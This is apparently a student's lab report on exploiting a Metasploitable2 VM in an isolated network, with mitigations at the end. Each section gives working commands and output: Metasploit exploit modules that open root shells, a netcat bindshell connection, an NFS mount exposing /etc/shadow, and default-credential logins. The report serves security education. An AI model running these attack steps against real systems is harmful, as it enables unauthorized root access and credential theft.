# Metasploitable2 Exploitation Report

**Name:** Ishmael Adam Ahmed
**Index Number:** 6126624
**Date:** 21 September 2026
**Target IP:** 192.168.56.102
**Attacker OS / Tools:** Fedora 44, Metasploit Framework 6.5.5-dev, Nmap 7.92

---

## Reconnaissance Summary

The target was a Metasploitable2 virtual machine located on an isolated host-only network. The target IP address was identified as:

`192.168.56.102`

Connectivity was verified with:

```bash
ping -c 4 192.168.56.102
```

The target responded successfully with 4 packets received and 0% packet loss.

Service enumeration was performed using:

```bash
nmap -sV -sC 192.168.56.102
```

Important discovered services included:

|    Port | Service    | Version / Information      |
| ------: | ---------- | -------------------------- |
|      21 | FTP        | vsftpd 2.3.4               |
|      22 | SSH        | OpenSSH 4.7p1              |
|      23 | Telnet     | Linux telnetd              |
|      25 | SMTP       | Postfix                    |
|      53 | DNS        | BIND 9.4.2                 |
|      80 | HTTP       | Apache 2.2.8               |
| 139/445 | SMB        | Samba                      |
| 512-514 | R-services | rexecd/rlogin/rsh          |
|    1099 | Java RMI   | GNU Classpath grmiregistry |
|    1524 | Bindshell  | Metasploitable root shell  |
|    2049 | NFS        | NFS v2-4                   |
|    2121 | FTP        | ProFTPD 1.3.1              |
|    3306 | MySQL      | MySQL 5.0.51a              |
|    5432 | PostgreSQL | PostgreSQL 8.3.x           |
|    5900 | VNC        | VNC protocol 3.3           |
|    6667 | IRC        | UnrealIRCd                 |
|    8009 | AJP13      | Apache JServ               |
|    8180 | HTTP       | Apache Tomcat              |

The scan also identified security weaknesses including disabled SMB message signing and an accessible guest account.

Further reconnaissance was performed using Metasploit searches and auxiliary scanners to identify exploitable services and available modules.

**Reconnaissance evidence:** `evidence/recon.png` and `evidence/recon.txt`

---

## Exploit 1: vsftpd 2.3.4 Backdoor

* **Service / Port:** FTP / TCP 21
* **Vulnerability:** Backdoored vsftpd 2.3.4 release
* **Tool Used:** Metasploit Framework
* **Why This Tool:** Metasploit contains a module specifically designed to detect and exploit the backdoor in vsftpd 2.3.4 and automatically establish a session.

### Steps

```text
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.1
run
```

The module identified the FTP banner as:

```text
220 (vsFTPd 2.3.4)
```

Metasploit then reported:

```text
The target appears to be vulnerable
Backdoor has been spawned!
Meterpreter session opened
```

The resulting session was verified:

```text
getuid
```

Result:

```text
Server username: root
```

A shell was then opened and verified:

```text
shell
whoami
root

id
uid=0(root) gid=0(root)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit1.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** Remote code execution resulted in a root-level shell on the Metasploitable2 host. An attacker could therefore execute commands with full system privileges.

---

## Exploit 2: Samba usermap_script

* **Service / Port:** SMB / TCP 139 and 445
* **Vulnerability:** Samba `usermap_script` command execution vulnerability
* **Tool Used:** Metasploit Framework
* **Why This Tool:** Metasploit provides a dedicated module that sends the malicious SMB request required to trigger the vulnerable Samba configuration.

### Steps

```text
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set LHOST 192.168.56.1
run
```

A command shell session was successfully opened.

The shell was verified:

```text
whoami
root

id
uid=0(root) gid=0(root)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit2.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** The vulnerability allowed remote command execution with root privileges, giving an attacker complete control over the vulnerable host.

---

## Exploit 3: UnrealIRCd Backdoor

* **Service / Port:** IRC / TCP 6667
* **Vulnerability:** Backdoor in UnrealIRCd 3.2.8.1
* **Tool Used:** Metasploit Framework
* **Why This Tool:** Metasploit contains a module specifically targeting the malicious backdoor command present in the vulnerable UnrealIRCd version.

### Steps

```text
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.1
run
```

Metasploit successfully opened a session.

The resulting access was verified:

```text
whoami
root

id
uid=0(root) gid=0(root)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit3.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** The IRC backdoor allowed remote command execution as root.

---

## Exploit 4: Java RMI Server

* **Service / Port:** Java RMI / TCP 1099
* **Vulnerability:** Insecure Java RMI service allowing remote code execution
* **Tool Used:** Metasploit Framework
* **Why This Tool:** Metasploit provides a Java RMI exploitation module capable of delivering a payload through the vulnerable RMI service.

### Steps

```text
msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.56.102
set RPORT 1099
set LHOST 192.168.56.1
run
```

The first attempt encountered a local port conflict on port 8080. The payload server port was changed:

```text
set SRVPORT 8081
run
```

The exploit then successfully opened a Meterpreter session.

The session was verified:

```text
getuid
```

Result:

```text
Server username: root
```

A shell was opened and verified:

```text
shell

whoami
root

id
uid=0(root) gid=0(root)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit4.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** Remote code execution resulted in root-level access to the target.

---

## Exploit 5: Root Bindshell on Port 1524

* **Service / Port:** TCP 1524
* **Vulnerability:** Intentionally exposed root bindshell
* **Tool Used:** Nmap/Metasploit port scanner and Netcat
* **Why This Tool:** Port scanning confirmed that TCP 1524 was accessible, while Netcat provided a simple way to connect directly to the exposed shell.

### Steps

The port was first confirmed as open:

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.102
set PORTS 1524
run
```

Result:

```text
192.168.56.102:1524 - TCP OPEN
```

A direct connection was then established:

```bash
nc 192.168.56.102 1524
```

The remote shell returned:

```text
root@metasploitable:/#
```

Access was verified:

```text
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit5.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** The exposed service provided immediate root-level command-line access without requiring authentication.

---

## Exploit 6: NFS Root Filesystem Exposure

* **Service / Port:** NFS / TCP/UDP 2049
* **Vulnerability:** The target exported the entire root filesystem to remote clients.
* **Tool Used:** `showmount` and NFS mount
* **Why This Tool:** `showmount` identifies NFS exports, while the mount command allows an accessible export to be examined locally.

### Steps

The available NFS exports were enumerated:

```bash
showmount -e 192.168.56.102
```

Result:

```text
Export list for 192.168.56.102:
/ *
```

A local mount point was created:

```bash
mkdir -p ~/metasploitable-nfs
```

The exported root filesystem was mounted:

```bash
sudo mount -t nfs -o vers=3,nolock 192.168.56.102:/ ~/metasploitable-nfs
```

The mounted filesystem was examined:

```bash
ls -la ~/metasploitable-nfs
```

The target's root filesystem was accessible, including sensitive files.

For example:

```bash
sudo ls -la ~/metasploitable-nfs/etc/shadow
```

The file was accessible through the NFS export.

The password database was also readable:

```bash
sudo head -n 5 ~/metasploitable-nfs/etc/passwd
```

The filesystem was then unmounted:

```bash
sudo umount ~/metasploitable-nfs
```

* **Evidence:** `evidence/exploit6.png`, `evidence/exploit6(1).png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
* **Outcome / Impact:** An attacker could remotely mount the target's entire root filesystem and access sensitive operating-system files, including `/etc/shadow`. This represents a severe confidentiality and integrity risk.

---

## Exploit 7: PostgreSQL Default Credentials

* **Service / Port:** PostgreSQL / TCP 5432
* **Vulnerability:** Default PostgreSQL credentials
* **Tool Used:** Metasploit `postgres_login`
* **Why This Tool:** The module is designed to test PostgreSQL credentials and can create a database session after successful authentication.

### Steps

```text
msfconsole
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.56.102
set RPORT 5432
set USERNAME postgres
set PASSWORD postgres
run
```

Metasploit reported:

```text
Login Successful: postgres:postgres@template1
```

A database session was created:

```text
set CreateSession true
run
```

The session was then examined:

```text
query SELECT version();
```

The target returned PostgreSQL version information.

The authenticated database user was confirmed:

```text
query SELECT current_user;
```

Result:

```text
postgres
```

The available databases were also enumerated:

```text
query SELECT datname FROM pg_database;
```

* **Evidence:** `evidence/exploit7.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
* **Outcome / Impact:** Default credentials provided authenticated access to the PostgreSQL server. An attacker could enumerate databases and potentially access or modify application data depending on database privileges.

---

## Exploit 8: Apache Tomcat Manager Default Credentials and RCE

* **Service / Port:** Apache Tomcat Manager / TCP 8180
* **Vulnerability:** Default Tomcat Manager credentials allowing authenticated application deployment
* **Tool Used:** Metasploit
* **Why This Tool:** Metasploit provides modules for testing Tomcat Manager credentials and deploying a malicious WAR file to obtain remote code execution.

### Steps

First, the Tomcat Manager credentials were tested:

```text
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.102
set RPORT 8180
set TARGETURI /manager/html
run
```

Metasploit found:

```text
Login Successful: tomcat:tomcat
```

The Tomcat deployment module was then selected:

```text
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.56.102
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 192.168.56.1
run
```

The module successfully uploaded and executed a WAR payload:

```text
Uploading ... bytes as ... .war
Executing ... .jsp
Sending stage ...
Meterpreter session opened
```

The resulting access was verified:

```text
getuid
```

Result:

```text
Server username: tomcat55
```

A shell was opened:

```text
shell

whoami
tomcat55

id
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)

hostname
metasploitable
```

* **Evidence:** `evidence/exploit8.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** Default credentials provided access to the Tomcat Manager interface, which allowed deployment and execution of a malicious WAR file. This resulted in remote code execution as the `tomcat55` service account.

---

## Exploit 9: VNC Weak Password

* **Service / Port:** VNC / TCP 5900
* **Vulnerability:** Weak VNC password
* **Tool Used:** Metasploit `vnc_login` and VNC Viewer
* **Why This Tool:** Metasploit can test VNC authentication and identify weak passwords. VNC Viewer was then used to confirm actual graphical access.

### Steps

First, VNC authentication was examined:

```text
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.56.102
set RPORT 5900
run
```

The scan showed that authentication was enabled.

The VNC login scanner was then used:

```text
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.56.102
set RPORT 5900
set BLANK_PASSWORDS true
set STOP_ON_SUCCESS true
run
```

Metasploit initially reported an unsuccessful blank-password attempt, followed by:

```text
Login Successful: :password
```

The credentials were then used with VNC Viewer:

```bash
vncviewer 192.168.56.102:5900
```

The password `password` was entered, and the graphical VNC session successfully opened.

* **Evidence:** `evidence/exploit9.png`, `evidence/exploit9(1).png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** A weak VNC password allowed unauthorized remote graphical access to the target. An attacker with this access could interact with the graphical environment as the authenticated VNC user.

---

## Exploit 10: Telnet Default Credentials

* **Service / Port:** Telnet / TCP 23
* **Vulnerability:** Default `msfadmin` credentials over an insecure Telnet service
* **Tool Used:** Metasploit `telnet_login`
* **Why This Tool:** Metasploit can test Telnet credentials and automatically establish a command shell after successful authentication.

### Steps

```text
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.56.102
set RPORT 23
set USERNAME msfadmin
set PASSWORD msfadmin
set STOP_ON_SUCCESS true
run
```

Metasploit reported:

```text
Login Successful: msfadmin:msfadmin
Command shell session opened
```

The shell was accessed:

```text
sessions -i 8
```

Access was verified:

```text
whoami
```

Result:

```text
msfadmin
```

The account information was examined:

```text
id
```

Result:

```text
uid=1000(msfadmin) gid=1000(msfadmin)
```

The target hostname was also confirmed:

```text
hostname
```

Result:

```text
metasploitable
```

* **Evidence:** `evidence/exploit10.png`
* **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Command and Control, Actions on Objectives
* **Outcome / Impact:** Default credentials provided an interactive remote shell as the `msfadmin` account. Because Telnet transmits credentials and session data insecurely, an attacker capable of observing network traffic could potentially capture authentication information.

---

## Kill Chain Coverage Summary

| Exploit                   | Recon | Weaponization | Delivery | Exploitation | Installation |  C2 | Actions on Objectives |
| ------------------------- | :---: | :-----------: | :------: | :----------: | :----------: | :-: | :-------------------: |
| 1. vsftpd backdoor        |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 2. Samba usermap_script   |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 3. UnrealIRCd backdoor    |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 4. Java RMI               |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 5. Root bindshell         |   ✓   |       —       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 6. NFS exposure           |   ✓   |       —       |     ✓    |       ✓      |       —      |  —  |           ✓           |
| 7. PostgreSQL credentials |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  —  |           ✓           |
| 8. Tomcat Manager RCE     |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 9. VNC weak password      |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |
| 10. Telnet credentials    |   ✓   |       ✓       |     ✓    |       ✓      |       —      |  ✓  |           ✓           |

**Note:** Installation was not marked for these attacks because the demonstrated exercises established temporary access or execution rather than installing verified persistent malware or backdoors on the system.

---

## Lessons Learned / Mitigations

The exploitation exercise demonstrated that several different weaknesses can provide unauthorized access to the same system. The main security lessons and corresponding mitigations are:

1. **Remove vulnerable or backdoored software versions.**

   * Upgrade outdated services such as vsftpd, Samba, UnrealIRCd, PostgreSQL, Apache Tomcat, and other exposed software.

2. **Never use default credentials.**

   * Change vendor or installation-default usernames and passwords immediately.
   * Use strong, unique credentials for every service.

3. **Disable unnecessary services.**

   * Telnet, r-services, exposed database services, VNC, and other unnecessary network services should be disabled when not required.

4. **Use secure alternatives.**

   * Replace Telnet and r-services with SSH.
   * Use encrypted remote-management protocols instead of insecure plaintext services.

5. **Restrict NFS exports.**

   * Do not export the entire root filesystem.
   * Restrict exports to required directories and trusted hosts.
   * Apply appropriate export options and authentication controls.

6. **Secure database servers.**

   * Do not expose database services unnecessarily.
   * Use strong authentication and restrict access with network controls.

7. **Secure Tomcat Manager.**

   * Remove default credentials.
   * Restrict Manager access to trusted administrative hosts.
   * Apply strong authentication and least-privilege principles.

8. **Use strong VNC authentication.**

   * Replace weak passwords with strong credentials.
   * Restrict VNC access to trusted networks or use secure tunneling.

9. **Apply network segmentation and firewall rules.**

   * Services should not be directly reachable from untrusted networks unless required.
   * Administrative services should be restricted to authorized systems.

10. **Perform regular vulnerability assessments.**

    * Tools such as Nmap, SearchSploit, and Metasploit can help identify weaknesses in controlled security-testing environments.
    * Production systems should be continuously patched, monitored, and reviewed.

---

## Conclusion

The Metasploitable2 assessment demonstrated ten distinct successful attack paths against vulnerable services and configurations. The attacks ranged from software backdoors and remote-code-execution vulnerabilities to exposed filesystems, weak authentication, default credentials, and insecure remote-access services.

The exercise also demonstrated how individual attacks can map across multiple stages of the Cyber Kill Chain, beginning with reconnaissance and service identification and progressing through exploitation to remote access and post-compromise actions.

All exploitation was performed against the intentionally vulnerable Metasploitable2 virtual machine on an isolated lab network.
